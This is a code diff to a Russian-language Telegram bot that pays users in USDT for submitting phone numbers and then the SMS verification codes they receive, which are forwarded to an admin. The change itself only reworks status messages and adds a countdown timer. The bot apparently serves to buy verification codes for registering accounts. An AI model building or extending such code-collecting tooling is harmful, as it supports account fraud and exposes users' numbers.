@@ -19,8 +19,10 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 db_pool = None
 
-# Хранилище для ID сообщений, которые нужно удалить
-user_messages = {}
+# Хранилища
+user_status_msg = {}  # ID статусного сообщения
+user_timer_task = {}  # задачи таймера
+user_current_number = {}  # текущий номер для таймера
 
 # ========== ИНИЦИАЛИЗАЦИЯ БАЗЫ ДАННЫХ ==========
 async def init_db():
@@ -74,24 +76,67 @@ async def init_db():
         ''')
     logger.info("База данных готова")
 
-# ========== ФУНКЦИЯ УДАЛЕНИЯ СООБЩЕНИЙ ==========
-async def delete_old_messages(user_id: int, keep_last: int = 0):
-    if user_id in user_messages:
-        messages = user_messages[user_id]
-        for msg_id in messages[:-keep_last] if keep_last > 0 else messages:
-            try:
-                await bot.delete_message(user_id, msg_id)
-            except:
-                pass
-        user_messages[user_id] = messages[-keep_last:] if keep_last > 0 else []
+# ========== ФУНКЦИИ УПРАВЛЕНИЯ СООБЩЕНИЯМИ ==========
+async def update_status_message(user_id: int, text: str, keyboard=None):
+    """Обновляет или создает статусное сообщение"""
+    if user_id in user_status_msg:
+        try:
+            await bot.edit_message_text(
+                text,
+                chat_id=user_id,
+                message_id=user_status_msg[user_id],
+                reply_markup=keyboard,
+                parse_mode="HTML"
+            )
+            return
+        except:
+            pass
+    
+    # Если нет или не отредактировалось - создаем новое
+    if user_id in user_status_msg:
+        try:
+            await bot.delete_message(user_id, user_status_msg[user_id])
+        except:
+            pass
+    
+    msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode="HTML")
+    user_status_msg[user_id] = msg.message_id
 
-async def save_message(user_id: int, message_id: int):
-    if user_id not in user_messages:
-        user_messages[user_id] = []
-    user_messages[user_id].append(message_id)
-    # Оставляем только последние 10 сообщений
-    if len(user_messages[user_id]) > 10:
-        user_messages[user_id] = user_messages[user_id][-10:]
+async def delete_status_message(user_id: int):
+    """Удаляет статусное сообщение"""
+    if user_id in user_status_msg:
+        try:
+            await bot.delete_message(user_id, user_status_msg[user_id])
+        except:
+            pass
+        del user_status_msg[user_id]
+
+async def start_timer(user_id: int, number: str, seconds: int = 600):
+    """Запускает таймер с обновлением в сообщении"""
+    if user_id in user_timer_task:
+        user_timer_task[user_id].cancel()
+    
+    async def timer():
+        remaining = seconds
+        while remaining > 0:
+            minutes = remaining // 60
+            secs = remaining % 60
+            text = f"<b>⏳ Этот номер недавно обрабатывался</b>\n<i>Его можно поставить повторно только через</i> <code>{minutes:02d}:{secs:02d}</code>\n\n<i>Отправьте другой номер или подождите</i>"
+            await update_status_message(user_id, text)
+            await asyncio.sleep(1)
+            remaining -= 1
+        
+        # Таймер закончился
+        text = "<b>✅ Таймер закончился!</b>\n<i>Этот номер снова доступен для отправки</i>"
+        await update_status_message(user_id, text)
+        await asyncio.sleep(3)
+        await delete_status_message(user_id)
+        if user_id in user_timer_task:
+            del user_timer_task[user_id]
+        if user_id in user_current_number:
+            del user_current_number[user_id]
+    
+    user_timer_task[user_id] = asyncio.create_task(timer())
 
 # ========== КЛАВИАТУРЫ ==========
 def get_main_keyboard():
@@ -130,12 +175,11 @@ async def cmd_start(message: types.Message):
         ''', user_id, username)
     
     channel_link = get_channel_link()
-    msg = await message.answer(
+    await message.answer(
         f"<b>🔐 JetMax - твое богатое будущее!</b>\n<i>Для дальнейшей работы с ботом подпишитесь на канал:</i> {channel_link}",
         reply_markup=get_main_keyboard(),
         parse_mode="HTML"
     )
-    await save_message(user_id, msg.message_id)
 
 @dp.message(F.text == "Баланс")
 async def show_balance(message: types.Message):
@@ -144,22 +188,14 @@ async def show_balance(message: types.Message):
         row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", user_id)
         balance = row["balance"] if row else 0.00
     
-    # Удаляем старые сообщения
-    await delete_old_messages(user_id)
-    
-    msg = await message.answer(
+    await message.answer(
         f"<b>💳 Ваш текущий баланс:</b>\n<code>{balance:.2f} USDT</code>\n\n<i>Для вывода введите !send {balance:.2f}</i>",
         parse_mode="HTML"
     )
-    await save_message(user_id, msg.message_id)
-    await save_message(user_id, message.message_id)
 
 @dp.message(Command("menu"))
 async def cmd_menu(message: types.Message):
-    user_id = message.from_user.id
-    await delete_old_messages(user_id)
-    msg = await message.answer("<b>Меню:</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
-    await save_message(user_id, msg.message_id)
+    await message.answer("<b>Меню:</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
 
 # ========== АДМИНКА ==========
 @dp.message(Command("admin"))
@@ -244,20 +280,15 @@ async def call_send_number(callback: types.CallbackQuery):
         
         await conn.execute("UPDATE users SET waiting_for_number = TRUE WHERE user_id = $1", user_id)
     
-    # Удаляем старые сообщения
-    await delete_old_messages(user_id)
-    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Отменить", callback_data="cancel_number")]
     ])
     
-    msg = await bot.send_message(
+    await update_status_message(
         user_id,
         "<b>⏱️ Заявка принята!</b>\n<i>Отправьте ниже свой номер в любом формате</i>\n<i>Таймер на выполнение:</i> <code>1 мин</code>",
-        reply_markup=keyboard,
-        parse_mode="HTML"
+        keyboard
     )
-    await save_message(user_id, msg.message_id)
     
     asyncio.create_task(timeout_number(user_id))
 
@@ -267,9 +298,9 @@ async def timeout_number(user_id: int):
         waiting = await conn.fetchval("SELECT waiting_for_number FROM users WHERE user_id = $1", user_id)
         if waiting:
             await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
-            msg = await bot.send_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>", parse_mode="HTML")
-            await save_message(user_id, msg.message_id)
-            await delete_old_messages(user_id)
+            await update_status_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>")
+            await asyncio.sleep(3)
+            await delete_status_message(user_id)
 
 @dp.callback_query(F.data == "cancel_number")
 async def cancel_number(callback: types.CallbackQuery):
@@ -279,16 +310,14 @@ async def cancel_number(callback: types.CallbackQuery):
     async with db_pool.acquire() as conn:
         await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
     
-    await callback.message.delete()
-    msg = await bot.send_message(user_id, "<b>❌ Заявка отменена</b>", parse_mode="HTML")
-    await save_message(user_id, msg.message_id)
+    await delete_status_message(user_id)
+    await bot.send_message(user_id, "<b>❌ Заявка отменена</b>", parse_mode="HTML")
     await bot.send_message(
         ADMIN_ID,
         f"<b>🔐 Заявка отменена!</b>\n<i>Пользователь:</i> @{username} [<code>{user_id}</code>]",
         parse_mode="HTML"
     )
     await callback.answer()
-    await delete_old_messages(user_id)
 
 # ========== ГЛАВНЫЙ ХЭНДЛЕР ==========
 @dp.message()
@@ -305,7 +334,12 @@ async def handle_all_messages(message: types.Message):
         if waiting_number:
             number = text
             
-            # Проверяем, не ставился ли этот номер недавно
+            # Проверяем, не на таймере ли этот номер
+            if user_id in user_current_number and user_current_number[user_id] == number:
+                # Номер на таймере - показываем оставшееся время (таймер уже обновляется сам)
+                return
+            
+            # Проверяем в БД, не ставился ли этот номер недавно
             last_time = await conn.fetchval(
                 "SELECT number_timestamp FROM users WHERE user_id = $1 AND current_number = $2",
                 user_id, number
@@ -314,17 +348,10 @@ async def handle_all_messages(message: types.Message):
             if last_time:
                 elapsed = int(time.time()) - last_time
                 if elapsed < 600:
-                    remaining = 600 - elapsed
-                    minutes = remaining // 60
-                    seconds = remaining % 60
-                    # Показываем таймер, НО НЕ СБРАСЫВАЕМ waiting_for_number
-                    msg = await message.answer(
-                        f"<b>⏳ Этот номер недавно обрабатывался</b>\n<i>Его можно поставить повторно только через</i> <code>{minutes:02d}:{seconds:02d}</code>\n\n<i>Отправьте другой номер или подождите</i>",
-                        parse_mode="HTML"
-                    )
-                    await save_message(user_id, msg.message_id)
-                    await save_message(user_id, message.message_id)
-                    # НЕ ОТКЛЮЧАЕМ waiting_for_number - пользователь может отправить другой номер
+                    # Запускаем таймер для этого номера
+                    user_current_number[user_id] = number
+                    await start_timer(user_id, number, 600 - elapsed)
+                    # НЕ сбрасываем waiting_for_number - пользователь может отправить другой номер
                     return
             
             # Номер не блокирован - принимаем
@@ -354,13 +381,11 @@ async def handle_all_messages(message: types.Message):
                 parse_mode="HTML"
             )
             
-            # Удаляем старые сообщения и отправляем новое
-            await delete_old_messages(user_id)
-            msg = await message.answer(
-                "<b>💼 Номер принят!</b>\n<i>Отправьте в чат с ботом SMS для подтверждения номера (оно придет в течение 3-х минут)</i>",
-                parse_mode="HTML"
+            # Создаем статусное сообщение
+            await update_status_message(
+                user_id,
+                f"<b>💼 Номер принят!</b>\n<i>Отправьте в чат с ботом SMS для подтверждения номера (оно придет в течение 3-х минут)</i>\n\n<b>Статус: код еще не запрошен</b>"
             )
-            await save_message(user_id, msg.message_id)
             return
         
         waiting_sms = await conn.fetchval("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
@@ -391,10 +416,9 @@ async def handle_all_messages(message: types.Message):
                 parse_mode="HTML"
             )
             
-            # Удаляем старые сообщения
-            await delete_old_messages(user_id)
-            msg = await message.answer("<b>✅ Код отправлен администратору</b>", parse_mode="HTML")
-            await save_message(user_id, msg.message_id)
+            # Удаляем статусное сообщение
+            await delete_status_message(user_id)
+            await message.answer("<b>✅ Код отправлен администратору</b>", parse_mode="HTML")
             return
 
 # ========== ДЕЙСТВИЯ АДМИНА ==========
@@ -410,16 +434,12 @@ async def request_sms(callback: types.CallbackQuery):
         [InlineKeyboardButton(text="Отменить", callback_data="cancel_sms")]
     ])
     
-    # Удаляем старые сообщения пользователя
-    await delete_old_messages(user_id)
-    
-    msg = await bot.send_message(
+    # Обновляем статусное сообщение - меняем статус и добавляем кнопку отмены
+    await update_status_message(
         user_id,
-        "<b>⏱️ Введите код из смс!</b>\n<i>Таймер на выполнение:</i> <code>1 мин</code>",
-        reply_markup=keyboard,
-        parse_mode="HTML"
+        f"<b>💼 Номер принят!</b>\n<i>Отправьте в чат с ботом SMS для подтверждения номера (оно придет в течение 3-х минут)</i>\n\n<b>Статус: в ожидании кода</b>",
+        keyboard
     )
-    await save_message(user_id, msg.message_id)
     
     asyncio.create_task(timeout_sms(user_id))
     await callback.answer("Запрос отправлен")
@@ -432,9 +452,9 @@ async def timeout_sms(user_id: int):
         if waiting:
             await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
             await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
-            msg = await bot.send_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>", parse_mode="HTML")
-            await save_message(user_id, msg.message_id)
-            await delete_old_messages(user_id)
+            await update_status_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>")
+            await asyncio.sleep(3)
+            await delete_status_message(user_id)
 
 @dp.callback_query(F.data.startswith("reject_"))
 async def reject_request(callback: types.CallbackQuery):
@@ -450,9 +470,8 @@ async def reject_request(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
-    msg = await bot.send_message(user_id, "<b>🔐 Заявка отклонена!</b>\n<i>Причина: отклонена администрацией</i>", parse_mode="HTML")
-    await save_message(user_id, msg.message_id)
-    await delete_old_messages(user_id)
+    await delete_status_message(user_id)
+    await bot.send_message(user_id, "<b>🔐 Заявка отклонена!</b>\n<i>Причина: отклонена администрацией</i>", parse_mode="HTML")
     await callback.answer("Заявка отклонена")
     await callback.message.delete_reply_markup()
 
@@ -484,15 +503,12 @@ async def number_accepted(callback: types.CallbackQuery):
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET current_number = NULL WHERE user_id = $1", user_id)
     
-    # Удаляем старые сообщения
-    await delete_old_messages(user_id)
-    
-    msg = await bot.send_message(
+    await delete_status_message(user_id)
+    await bot.send_message(
         user_id,
         f"<b>🎉 Номер принят!</b>\n<i>Вам успешно</i> <code>4.0$</code> <i>на баланс</i>\n\n<i>Номер заявки:</i> <code>#{request_number}</code>",
         parse_mode="HTML"
     )
-    await save_message(user_id, msg.message_id)
     await callback.answer("Номер принят")
     await callback.message.delete_reply_markup()
 
@@ -510,13 +526,12 @@ async def number_registered(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
-    msg = await bot.send_message(
+    await delete_status_message(user_id)
+    await bot.send_message(
         user_id,
         "<b>🔐 Номер уже зарегистрирован!</b>\n<i>Ожидайте создания следующей заявки в канале</i>",
         parse_mode="HTML"
     )
-    await save_message(user_id, msg.message_id)
-    await delete_old_messages(user_id)
     await callback.answer("Номер зарегистрирован")
     await callback.message.delete_reply_markup()
 
@@ -541,9 +556,8 @@ async def got_error(callback: types.CallbackQuery):
             await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
             await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
         
-        msg = await bot.send_message(user_id, f"<b>🔐 {reason}</b>", parse_mode="HTML")
-        await save_message(user_id, msg.message_id)
-        await delete_old_messages(user_id)
+        await delete_status_message(user_id)
+        await bot.send_message(user_id, f"<b>🔐 {reason}</b>", parse_mode="HTML")
         await message.answer("<b>✅ Причина отправлена</b>", parse_mode="HTML")
         dp.message.handlers.remove(get_error_reason)
 
@@ -561,10 +575,8 @@ async def cancel_sms(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
-    await callback.message.delete()
-    msg = await bot.send_message(user_id, "<b>❌ Заявка отменена</b>", parse_mode="HTML")
-    await save_message(user_id, msg.message_id)
-    await delete_old_messages(user_id)
+    await delete_status_message(user_id)
+    await callback.message.answer("<b>❌ Заявка отменена</b>", parse_mode="HTML")
     await callback.answer()
 
 # ========== ВЫВОД СРЕДСТВ ==========
